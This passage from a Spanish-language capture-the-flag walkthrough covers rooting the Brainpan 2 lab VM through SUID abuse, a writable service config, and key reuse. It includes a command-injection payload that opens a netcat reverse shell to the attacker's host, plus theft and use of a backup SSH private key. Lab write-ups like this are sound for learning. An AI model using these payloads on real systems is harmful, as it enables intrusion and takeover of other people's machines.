+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$ python2
+Python 2.7.3
+>>> </span><span class="p">import </span><span class="p">os
+>>> os.setreuid(</span><span class="p">104</span><span class="p">, </span><span class="p">104</span><span class="p">)
+>>> os.system(</span><span class="p">"bash"</span><span class="p">)
+</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ whoami
+root
+</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I  
+192.168.100.63 
+</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvemos a listar binarios con privilegios <code class="language-plaintext highlighter-rouge">suid</code>, y encontramos un <code class="language-plaintext highlighter-rouge">brainpan-1.8.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null  
+/opt/old/brainpan-1.8/brainpan-1.8.exe
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/su
+/home/reynard/msg_root
+</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El binario pertenece al usuario <code class="language-plaintext highlighter-rouge">puck</code>, en ese directorio tambien existe un archivo <code class="language-plaintext highlighter-rouge">brainpan.cfg</code> en el cual cualquier usuario permisos <code class="language-plaintext highlighter-rouge">rw-</code> por lo que puede escribir</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ ls -l
+-rwsr-xr-x 1 puck puck  17734 Nov  4  2013 </span><span class="err">brainpan-1.8.exe</span><span class="p">  
+-rw-r--r-- 1 puck puck   1227 Nov  5  2013 brainpan.7
+-rw-rw-rw- 1 puck staff    25 Jul 25 16:13 brainpan.cfg
+</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">cfg</code> contiene un <code class="language-plaintext highlighter-rouge">puerto</code> y una direccion <code class="language-plaintext highlighter-rouge">ip</code>, y parece que esta es la conifuracion que usa como listener el binario <code class="language-plaintext highlighter-rouge">brainpan-1.8.exe</code> al ejecutarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ cat brainpan.cfg
+port=9333
+ipaddr=127.0.0.1
+</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ ./brainpan-1.8.exe  
+port = 9333
+ipaddr = 127.0.0.1
++ bind done
++ waiting for connections...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que podemos escribir en el archivo cfg cambiamos la variable ipaddr por <code class="language-plaintext highlighter-rouge">0.0.0.0</code> para que podamos acceder al puerto <code class="language-plaintext highlighter-rouge">9333</code> desde nuestro equipo de atacante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ echo -e "port=9333\nipaddr=0.0.0.0" > brainpan.cfg  
+</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ cat brainpan.cfg
+port=9333
+ipaddr=0.0.0.0
+</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ ./brainpan-1.8.exe
+port = 9333
+ipaddr = 0.0.0.0
++ bind done
++ waiting for connections...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos al puerto <code class="language-plaintext highlighter-rouge">9333</code> podemos ver que corre el mismo servicio del inicio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">192.168.100.63 9333
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 1.8________________________]  
+                             LOGIN AS GUEST                             
+
+                          >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">comandos</code>, asi que volvemos a hacer el proceso de autenticarnos como <code class="language-plaintext highlighter-rouge">GUEST</code> y aprovechandonos de <code class="language-plaintext highlighter-rouge">VIEW</code> nos enviamos una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >> GUEST
+                          ACCESS GRANTED
+
+
+                             *  *  *  *                                
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
+    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
+                             *  *  *  *                                
+
+
+                          >> VIEW
+    ENTER FILE TO DOWNLOAD: test; netcat -e /bin/sh 192.168.100.85 443  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo recibimos nuevamente una shell esta vez como <code class="language-plaintext highlighter-rouge">puck</code>, al lanzarnos una <code class="language-plaintext highlighter-rouge">bash</code> usaremos el parametro <code class="language-plaintext highlighter-rouge">-p</code> ya que estamos bajo el contexto del binario <code class="language-plaintext highlighter-rouge">suid</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443 
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.63
+script /dev/null -c "bash -p"
+bash-4.2$ whoami
+puck
+bash-4.2$ hostname -I
+192.168.100.63 
+bash-4.2$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-root2">
+<br><h3 class="post-title">Shell - root 2</h3><br>
+
+<p class="plain-text">Nuevamente con python actualizamos nuestro uid y gid por <code class="language-plaintext highlighter-rouge">1001</code> correspondiente a <code class="language-plaintext highlighter-rouge">puck</code>, para asi obtener una <code class="language-plaintext highlighter-rouge">shell</code> que no tendra problemas por el identificador</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">bash-4.2$ python2 
+Python 2.7.3
+>>> </span><span class="p">import </span><span class="p">os
+>>> os.setreuid(</span><span class="p">1001</span><span class="p">, </span><span class="p">1001</span><span class="p">)
+>>> os.system(</span><span class="p">"bash"</span><span class="p">)
+</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ whoami 
+puck
+</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I  
+192.168.100.63 
+</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al listar todos los archivos existentes partiendo del home de <code class="language-plaintext highlighter-rouge">puck</code> encontramos un clave privada <code class="language-plaintext highlighter-rouge">id_rsa</code> dentro de un directorio oculto que es <code class="language-plaintext highlighter-rouge">~/.backup/.ssh/</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ find
+.
+./.ssh
+./.ssh/known_hosts
+./.ssh/id_rsa.pub
+./.ssh/id_rsa
+./.profile
+./.bash_history
+./.backup
+./.backup/.ssh
+./.backup/.ssh/id_rsa.pub  
+./.backup/.ssh/id_rsa
+./.backup/.profile
+./.backup/.bash_history
+./.backup/.bashrc
+./.backup/.bash_logout
+./.bashrc
+./.bash_logout
+</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al intentar conectarnos como el usuario <code class="language-plaintext highlighter-rouge">root </code> correspondiente al uid <code class="language-plaintext highlighter-rouge">0</code> al localhost nos dice que no tenemos conexion con el servicio ssh desde la <code class="language-plaintext highlighter-rouge">127.0.0.1:22</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ ssh "root "@127.0.0.1 -i .backup/.ssh/id_rsa  
+ssh: connect to host 127.0.0.1 port 22: Connection refused
+</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si vemos la configuracion de <code class="language-plaintext highlighter-rouge">ssh</code> vemos que el servicio corre en <code class="language-plaintext highlighter-rouge">127.0.1.1:2222</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ grep -vE '^$|^#' /etc/ssh/sshd_config | head -n2  
+Port 2222
+ListenAddress 127.0.1.1
+</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos como el usuario <code class="language-plaintext highlighter-rouge">root </code> a la <code class="language-plaintext highlighter-rouge">127.0.1.1</code> por el puerto <code class="language-plaintext highlighter-rouge">22</code> usando la <code class="language-plaintext highlighter-rouge">id_rsa</code> para autenticarnos y obtenemos una shell como el <code class="language-plaintext highlighter-rouge">root</code> que tiene el uid <code class="language-plaintext highlighter-rouge">0</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ ssh "root "@127.0.1.1 -p 2222 -i .backup/.ssh/id_rsa  
+</span><span class="ve">root @brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root ) gid=0(root ) groups=0(root )
+</span><span class="ve">root @brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+192.168.100.63 
+</span><span class="ve">root @brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/flag.txt 
+
+                          !!! CONGRATULATIONS !!!
+
+                 You've completed the Brainpan 2 challenge! 
+                 Or have you...? 
+
+                 Yes, you have! Pat yourself on the back. :-)
+
+                 Questions, comments, suggestions for new VM
+                 challenges? Let me know! 
+
+
+                 Twitter: @superkojiman
+                 Email  : contact@techorganic.com
+                 Web    : http://www.techorganic.com
+
+</span><span class="ve">root @brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
